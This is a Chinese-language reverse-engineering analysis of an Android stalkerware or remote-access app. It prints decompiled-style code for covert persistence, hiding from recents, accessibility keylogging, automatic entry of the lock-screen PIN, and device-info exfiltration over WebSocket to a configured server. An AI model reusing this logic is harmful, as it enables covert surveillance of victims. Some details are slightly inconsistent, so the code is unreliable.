# APK 运行流程分析

> 本文档详细分析 APK 安装后的完整运行流程，包括启动机制、服务依赖、通信协议和保活策略。

## 目录

1. [启动流程概览](#1-启动流程概览)
2. [核心组件详解](#2-核心组件详解)
3. [服务依赖关系](#3-服务依赖关系)
4. [WebSocket 通信协议](#4-websocket-通信协议)
5. [保活机制](#5-保活机制)
6. [无障碍服务](#6-无障碍服务)
7. [权限请求流程](#7-权限请求流程)

---

## 1. 启动流程概览

### 1.1 用户点击图标启动

```
用户点击应用图标
        ↓
┌─────────────────────────────────────────────────────────────┐
│                    ActivMain.onCreate()                      │
├─────────────────────────────────────────────────────────────┤
│  1. 检查 Draws_overs 配置 (悬浮窗权限)                        │
│  2. 检查 SDK >= 30 且无悬浮窗权限 → 跳转系统设置               │
│  3. 检查 tc.n 标志 (是否已隐藏)                               │
│     ├── 已隐藏 → setExcludeFromRecents(true) → finish()      │
│     └── 未隐藏 → 继续初始化                                   │
│  4. 检查 tc.o 标志 (是否从最近任务隐藏)                        │
│  5. 设置 UncaughtExceptionHandler                            │
│  6. 保存屏幕尺寸到 SharedPreferences                          │
│  7. 请求运行时权限 (相机、存储、位置等)                        │
│  8. 检查网络连接                                              │
│     ├── 无网络 → 显示 "无网络" 界面                           │
│     └── 有网络 → 检查 Is_Store 配置                           │
│         ├── Is_Store == "1" → 启动服务后 finish()             │
│         └── Is_Store != "1" → 显示 WebView 界面               │
└─────────────────────────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────────────────────────┐
│                      启动核心服务                             │
├─────────────────────────────────────────────────────────────┤
│  • EngineWorker (引擎服务)                                    │
│  • WorkServices (工作服务)                                    │
│  • LiveChat (WebSocket 通信服务)                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 开机自启动流程

```
系统广播: android.intent.action.BOOT_COMPLETED
        ↓
┌─────────────────────────────────────────────────────────────┐
│                  BootReceiver.onReceive()                    │
├─────────────────────────────────────────────────────────────┤
│  1. 验证 Intent Action == BOOT_COMPLETED                     │
│  2. 调用 bq.a(context) 初始化                                │
│  3. 检查并启动 EngineWorker (如未运行)                        │
│     └── SDK >= 26 → startForegroundService()                 │
│     └── SDK < 26  → startService()                           │
│  4. 检查并启动 WorkServices (如未运行)                        │
│  5. 检查网络 y80.b() 后启动 LiveChat (如未运行)               │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. 核心组件详解

### 2.1 EngineWorker (引擎服务)

**类**: `com.icontrol.protector.EngineWorker`  
**父类**: `android.app.Service`  
**职责**: 核心引擎，负责启动和协调其他服务

#### onCreate() 流程

```java
1. 调用 h(context) → 启动前台通知 (startForeground)
2. 检查设备 ID，如为空则生成并保存
3. 检查用户邮箱，如为空则使用 My_Configs.USR_MAIL
4. 启动 WorkServices (如未运行)
5. 检查网络后启动 LiveChat (如未运行)
```

#### 关键方法

| 方法 | 功能 |
|------|------|
| `h(Context)` | 创建前台通知，调用 startForeground() |
| `g(Context)` | 注册 WorkManager 定时任务 (每 15 分钟) |
| `f(Context)` | 首次运行初始化线程 |
| `d(String, Context)` | 禁用组件 |
| `e(String, Context)` | 启用组件 |

### 2.2 WorkServices (工作服务)

**类**: `com.icontrol.protector.WorkServices`  
**父类**: `android.app.Service`  
**职责**: 定时任务调度、悬浮窗管理、保活机制

#### 静态字段

```java
static PowerManager.WakeLock h;           // 静态 WakeLock
static AccessServices j;                   // 无障碍服务引用
static ReentrantLock k;                    // 线程锁
static int l = 100;                        // 计数器
static Context n;                          // 应用上下文
static ExecutorService o;                  // 线程池 (单线程)
static ScheduledExecutorService p;         // 定时任务线程池 (2线程)
```

#### onCreate() 流程

```java
1. 保存 applicationContext 到静态字段 n
2. 初始化 ov 对象 (加密相关)
3. 调用 d(context) → 启动前台通知
4. 调用 bq.a(context) → 初始化
5. 初始化 ReentrantLock (如为空)
6. 创建 ScheduledExecutorService
7. 获取 PowerManager
8. 调用 e() → 启动定时任务
```

#### e() 方法 - 定时任务调度

```java
// 任务1: 每 10 秒执行 (nl0 类)
p.scheduleAtFixedRate(new nl0(), 0, 10, TimeUnit.SECONDS);

// 任务2: 如果 Draws_overs == "1"，每 5 秒执行悬浮窗任务 (ol0 类)
if (My_Configs.Draws_overs.equals("1")) {
    p.scheduleAtFixedRate(new ol0(this), 0, 5, TimeUnit.SECONDS);
}

// 任务3: 提交后台任务 (pl0 类)
o.submit(new pl0());
```

#### onStartCommand() 流程

```java
1. 更新静态 Context
2. 调用 d(context) → 确保前台通知
3. 检查悬浮窗权限 → 调用 j() 添加悬浮窗
4. 获取 PowerManager
5. 初始化静态 WakeLock (PARTIAL_WAKE_LOCK)
6. 获取 WakeLock
7. 初始化 ReentrantLock
8. 返回 START_STICKY (1)
```

### 2.3 LiveChat (WebSocket 通信服务)

**类**: `com.icontrol.protector.LiveChat`  
**父类**: `android.app.Service`  
**职责**: 与服务器建立 WebSocket 连接，发送设备信息

#### 静态字段

```java
static ov d;                              // 加密对象
static PowerManager.WakeLock e;           // WakeLock
static Context f;                         // 应用上下文
static ExecutorService g;                 // 线程池 (4-8线程, 队列100)
static Object h;                          // 同步锁
static volatile boolean i;                // 连接状态标志
static boolean j;                         // 其他状态标志
```

#### D() 方法 - 发送设备信息 (核心)

这是 WorkServices 每 10 秒调用的方法，用于向服务器发送设备状态。

```java
public static void D() {
    // 1. 获取用户邮箱 (加密)
    String email = nv.a(f, "", "");
    String encryptedEmail = d.a(email);
    
    // 2. 收集设备信息
    String[] deviceInfo = C(f, email, formattedInfo);
    
    // 3. 构建 JSON 并发送
    String json = p(deviceInfo);
    k(f, json, "ping");  // 发送到服务器
}
```

#### C() 方法 - 收集设备信息

返回包含 15 个字段的字符串数组:

```java
String[] C(Context ctx, String p1, String p2) {
    return new String[] {
        mobName,        // [0] 设备名称 (My_Configs.Mob_Name)
        model,          // [1] 设备型号
        carrier,        // [2] 运营商
        androidId,      // [3] Android ID
        version,        // [4] 系统版本
        battery,        // [5] 电池电量
        locale,         // [6] 语言区域
        screenState,    // [7] 屏幕状态
        wifiName,       // [8] WiFi 名称
        networkType,    // [9] 网络类型
        permissions,    // [10] 权限状态
        adminDisplay,   // [11] 管理员显示名 (My_Configs.admindisplay)
        p00.b,          // [12] 某状态值
        screenStatus,   // [13] 屏幕开关状态
        u(),            // [14] 方法返回值
        t()             // [15] 方法返回值
    };
}
```

---

## 3. 服务依赖关系

### 3.1 启动依赖图

```
                    ┌─────────────────┐
                    │   BootReceiver  │
                    │  (开机广播)      │
                    └────────┬────────┘
                             │
              ┌──────────────┼──────────────┐
              ↓              ↓              ↓
    ┌─────────────────┐ ┌─────────────┐ ┌─────────────┐
    │  EngineWorker   │ │ WorkServices│ │  LiveChat   │
    │  (引擎服务)      │ │ (工作服务)   │ │ (通信服务)   │
    └────────┬────────┘ └──────┬──────┘ └─────────────┘
             │                 │
             │    ┌────────────┴────────────┐
             │    ↓                         ↓
             │  定时任务                   悬浮窗任务
             │  (每10秒)                   (每5秒)
             │    │
             │    ↓
             │  LiveChat.D()
             │  (发送设备信息)
             │
             ↓
    ┌─────────────────┐
    │   WorkManager   │
    │  (每15分钟)      │
    │   MyWorker      │
    └─────────────────┘
```

### 3.2 服务间调用关系

| 调用方 | 被调用方 | 触发条件 |
|--------|----------|----------|
| BootReceiver | EngineWorker | 开机广播 |
| BootReceiver | WorkServices | 开机广播 |
| BootReceiver | LiveChat | 开机广播 + 网络可用 |
| EngineWorker | WorkServices | onCreate() |
| EngineWorker | LiveChat | onCreate() + 网络可用 |
| WorkServices | LiveChat.D() | 每 10 秒定时任务 |
| AccessServices | EngineWorker | 服务监控线程 |
| AccessServices | WorkServices | 服务监控线程 |
| AccessServices | LiveChat | 服务监控线程 |

---

## 4. WebSocket 通信协议

### 4.1 连接地址

```
wss://[USER_DOM]/api/ws/
```

其中 `USER_DOM` 来自 `My_Configs.USER_DOM` 配置占位符。

### 4.2 发送的设备信息 JSON 结构

LiveChat.D() 方法构建并发送的 JSON 格式:

```json
{
    "id": "<加密的用户邮箱>",
    "type": "ping",
    "event": "deviceInfo",
    "data": {
        "mobName": "<设备名称>",
        "model": "<设备型号>",
        "carrier": "<运营商>",
        "androidId": "<Android ID>",
        "version": "<系统版本>",
        "battery": "<电池电量>",
        "locale": "<语言区域>",
        "screenState": "<屏幕状态>",
        "wifiName": "<WiFi名称>",
        "networkType": "<网络类型>",
        "permissions": "<权限状态>",
        "adminDisplay": "<管理员显示名>",
        "status": "<状态值>",
        "screenOn": "<屏幕开关>",
        "extra1": "<附加信息1>",
        "extra2": "<附加信息2>"
    }
}
```

### 4.3 通信频率

| 事件类型 | 频率 | 触发方 |
|----------|------|--------|
| ping (设备信息) | 每 10 秒 | WorkServices 定时任务 |
| 命令响应 | 实时 | 服务器推送 |

---

## 5. 保活机制

### 5.1 多重保活策略

APK 使用多种机制确保服务持续运行:

```
┌─────────────────────────────────────────────────────────────┐
│                       保活机制层次                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Layer 1: 前台服务 (Foreground Service)                     │
│  ├── EngineWorker.startForeground()                         │
│  ├── WorkServices.startForeground()                         │
│  └── LiveChat.startForeground()                             │
│                                                             │
│  Layer 2: WakeLock (防止 CPU 休眠)                          │
│  ├── WorkServices.h (静态 PARTIAL_WAKE_LOCK)                │
│  ├── WorkServices.c (实例 WakeLock)                         │
│  └── LiveChat.e (静态 WakeLock)                             │
│                                                             │
│  Layer 3: onDestroy() 重启                                  │
│  ├── 检查服务是否运行                                        │
│  ├── 如未运行 → startService() / startForegroundService()   │
│  └── AlarmManager 设置 15 秒后重启                          │
│                                                             │
│  Layer 4: onTaskRemoved() 重启                              │
│  ├── AlarmManager 设置 1 秒后重启                           │
│  └── PendingIntent.getService() 创建重启 Intent             │
│                                                             │
│  Layer 5: WorkManager 定时任务                              │
│  ├── EngineWorker 注册 MyWorker                             │
│  └── 每 15 分钟执行，确保服务运行                            │
│                                                             │
│  Layer 6: AccessServices 监控线程                           │
│  ├── 每 5 秒检查服务状态                                     │
│  └── 如服务停止 → 重新启动                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.2 WorkServices.onDestroy() 实现

```java
public void onDestroy() {
    super.onDestroy();
    
    // 1. 释放 WakeLock
    i();  // 释放静态和实例 WakeLock
    
    // 2. 关闭定时任务
    d.shutdownNow();
    
    // 3. 创建重启 Intent
    Intent intent = new Intent(getApplicationContext(), WorkServices.class);
    
    // 4. 检查服务是否运行，如未运行则重启
    if (!ba.a(getApplicationContext(), WorkServices.class)) {
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
    
    // 5. 使用 AlarmManager 设置 15 秒后重启
    j2.a(getApplicationContext(), WorkServices.class, 
         System.currentTimeMillis() + 15000);
}
```

### 5.3 WorkServices.onTaskRemoved() 实现

```java
public void onTaskRemoved(Intent rootIntent) {
    super.onTaskRemoved(rootIntent);
    
    // 1. 释放 WakeLock
    i();
    
    // 2. 检查服务是否运行
    if (!ba.a(getApplicationContext(), WorkServices.class)) {
        // 3. 使用 AlarmManager 设置 15 秒后重启
        j2.a(getApplicationContext(), WorkServices.class,
             System.currentTimeMillis() + 15000);
        
        // 4. 创建 PendingIntent 用于 AlarmManager
        Intent intent = new Intent(getApplicationContext(), getClass());
        intent.setPackage(getPackageName());
        PendingIntent pendingIntent = PendingIntent.getService(
            getApplicationContext(), 1, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        // 5. 设置 1 秒后触发
        AlarmManager alarmManager = (AlarmManager) getSystemService("alarm");
        alarmManager.set(AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000, pendingIntent);
    }
}
```

### 5.4 AccessServices 服务监控

AccessServices 中有一个专门的线程监控核心服务:

```java
// 方法 r() - 服务监控线程
private void r() {
    Context ctx = getApplicationContext();
    while (!Thread.currentThread().isInterrupted()) {
        try {
            n(ctx);  // 检查并重启服务
            Thread.sleep(5000);  // 每 5 秒检查一次
        } catch (InterruptedException e) {
            break;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// 方法 n(Context) - 检查并启动服务
private void n(Context ctx) {
    // 检查 EngineWorker
    if (!ba.a(ctx, EngineWorker.class)) {
        y(ctx, EngineWorker.class);  // 启动服务
    }
    
    // 检查 WorkServices
    if (!ba.a(ctx, WorkServices.class)) {
        y(ctx, WorkServices.class);
    }
    
    // 检查 LiveChat (需要网络)
    if (y80.b()) {  // 网络可用
        if (!ba.a(ctx, LiveChat.class)) {
            y(ctx, LiveChat.class);
        }
    }
}
```

---

## 6. 无障碍服务

### 6.1 AccessServices 概述

**类**: `com.icontrol.protector.AccessServices`  
**父类**: `android.accessibilityservice.AccessibilityService`  
**职责**: 监控系统事件、自动点击、键盘记录、屏幕监控

### 6.2 静态字段

```java
// UI 相关
static WindowManager q;                    // 悬浮窗管理器
static WindowManager.LayoutParams r;       // 悬浮窗参数
static View s;                             // 悬浮窗视图
static WindowManager t;                    // 另一个窗口管理器
static WindowManager.LayoutParams w;       // 窗口参数
static FrameLayout G;                      // 框架布局
static LinearLayout J;                     // 线性布局
static TextView K, M;                      // 文本视图
static ProgressBar L;                      // 进度条

// 状态相关
static AccessServices N;                   // 服务实例
static String O = "";                      // 当前包名
static String P = " ";                     // 分隔符
static String Q;                           // 某字符串
static String R = "";                      // 输入缓存
static String S = "";                      // PIN 码
static boolean T, U, V;                    // 状态标志
static String W = "", X = "";              // 其他字符串

// 数据相关
static List u;                             // 列表
static LinkedHashMap v;                    // 有序映射
static HashMap Y;                          // 哈希映射
static int Z = 1;                          // 通知 ID 计数器
```

### 6.3 实例字段

```java
WebView b;                                 // WebView (用于注入)
int c, d, e;                               // 尺寸/计数器
boolean f;                                 // 状态标志
h70 g;                                     // 某对象
Handler h, i;                              // 消息处理器
ThreadPoolExecutor j;                      // 线程池 (10线程)
Thread k, m;                               // 监控线程
PowerManager.WakeLock l;                   // WakeLock
WifiManager.WifiLock n;                    // WiFi 锁
```

### 6.4 onAccessibilityEvent() 事件处理

AccessServices 监听以下事件类型:

| 事件类型 | 处理逻辑 |
|----------|----------|
| TYPE_VIEW_FOCUSED (0x08) | 记录焦点变化 |
| TYPE_VIEW_TEXT_CHANGED (0x10) | 键盘记录 |
| TYPE_WINDOW_STATE_CHANGED (0x20) | 窗口切换检测 |
| TYPE_WINDOW_CONTENT_CHANGED (0x800) | 内容变化检测 |

### 6.5 j() 方法 - 检测系统应用

```java
private boolean j(AccessibilityEvent event) {
    if (event.getEventType() == TYPE_WINDOW_STATE_CHANGED) {
        String pkg = event.getPackageName();
        // 检测是否为系统设置相关应用
        if (pkg.equals("com.android.settings") ||
            pkg.equals("com.miui.securitycenter") ||
            pkg.equals("com.samsung.android.lool") ||
            pkg.equals("com.coloros.safecenter")) {
            return true;
        }
    }
    return false;
}
```

### 6.6 B() 方法 - 自动点击 PIN 码

```java
private void B() {
    // 获取保存的 PIN 码
    String pin = nv.a(N, "pin", "");
    if (pin.isEmpty()) return;
    
    // 获取 PIN 码序列
    String sequence = nv.a(N, "seq", "");
    if (sequence.isEmpty()) return;
    
    S = nv.a(N, "pin_s", "");
    
    // 获取根节点
    AccessibilityNodeInfo root = getRootInActiveWindow();
    
    // 遍历 PIN 码每一位
    for (int i = 0; i < sequence.length(); i++) {
        // 根据设备类型构建视图 ID
        String viewId;
        if (zf0.c()) {  // 三星设备
            viewId = "com.android.systemui:id/key" + sequence.substring(i, i+1);
        } else {
            viewId = "com.android.systemui:id/key" + sequence.substring(i, i+1);
        }
        
        // 查找并点击
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        if (!nodes.isEmpty()) {
            nodes.get(0).performAction(ACTION_CLICK);
        }
    }
    
    // 点击确认按钮
    // ...
}
```

---

## 7. 权限请求流程

### 7.1 ActivMain.c() - 请求的权限列表

```java
public static String[] c() {
    List<String> permissions = new ArrayList<>();
    
    permissions.add("android.permission.CAMERA");
    permissions.add("android.permission.RECORD_AUDIO");
    permissions.add("android.permission.ACCESS_FINE_LOCATION");
    permissions.add("android.permission.READ_EXTERNAL_STORAGE");
    permissions.add("android.permission.WRITE_EXTERNAL_STORAGE");
    
    return permissions.toArray(new String[0]);
}
```

### 7.2 权限请求时机

| 权限 | 请求时机 | 用途 |
|------|----------|------|
| CAMERA | ActivMain.onCreate() | 摄像头监控 |
| RECORD_AUDIO | ActivMain.onCreate() | 麦克风监控 |
| ACCESS_FINE_LOCATION | ActivMain.onCreate() | 位置追踪 |
| READ/WRITE_STORAGE | ActivMain.onCreate() | 文件访问 |
| SYSTEM_ALERT_WINDOW | 检测到需要时 | 悬浮窗 |
| BIND_ACCESSIBILITY_SERVICE | 引导用户开启 | 无障碍服务 |
| POST_NOTIFICATIONS (Android 13+) | 运行时检查 | 通知权限 |

---

## 附录 A: 关键类映射

| 混淆类名 | 推测功能 |
|----------|----------|
| `v90` | 字符串解密工具 |
| `nv` | SharedPreferences 工具 |
| `ba` | 服务状态检查工具 |
| `y80` | 网络状态检查工具 |
| `cg0` | 设备信息收集工具 |
| `ov` | 加密/解密工具 |
| `mv` | 通知构建工具 |
| `tc` | 常量定义类 |
| `j2` | AlarmManager 工具 |
| `h70` | 某功能模块 |

## 附录 B: 配置占位符引用

运行时使用的 `My_Configs` 占位符:

| 占位符 | 运行时用途 |
|--------|------------|
| `USER_DOM` | WebSocket 服务器地址 |
| `USR_MAIL` | 用户标识邮箱 |
| `Mob_Name` | 设备显示名称 |
| `Draws_overs` | 是否启用悬浮窗 ("1"=启用) |
| `Is_Store` | 是否为商店模式 ("1"=是) |
| `admindisplay` | 管理员显示名 |
| `_Notfy_TITL_` | 通知标题 |

---

*文档生成时间: 2026-01-29*  
*相关文档: [APK_STUB_TEMPLATE.md](./APK_STUB_TEMPLATE.md)*
